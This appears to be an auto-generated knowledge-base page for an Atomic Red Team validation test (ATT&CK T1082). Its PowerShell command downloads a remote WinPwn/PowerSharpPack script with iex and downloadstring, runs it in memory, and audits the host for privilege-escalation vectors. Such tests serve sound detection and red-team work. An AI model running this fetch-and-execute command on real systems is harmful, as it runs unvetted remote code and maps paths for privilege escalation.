---
atomic_guid: "efb79454-1101-4224-a4d0-30c9c8b29ffc"
title: "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors"
framework: "atomic"
generated: "true"
attack_technique_id: "T1082"
attack_technique_name: "System Information Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "efb79454-1101-4224-a4d0-30c9c8b29ffc"
  - "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors

PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.

## Metadata

- Atomic GUID: efb79454-1101-4224-a4d0-30c9c8b29ffc
- Technique: T1082: System Information Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1082/T1082.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1082-system_information_discovery|T1082]]

## Executor

- name: powershell

### Command

```powershell
$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command "audit"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.yaml)
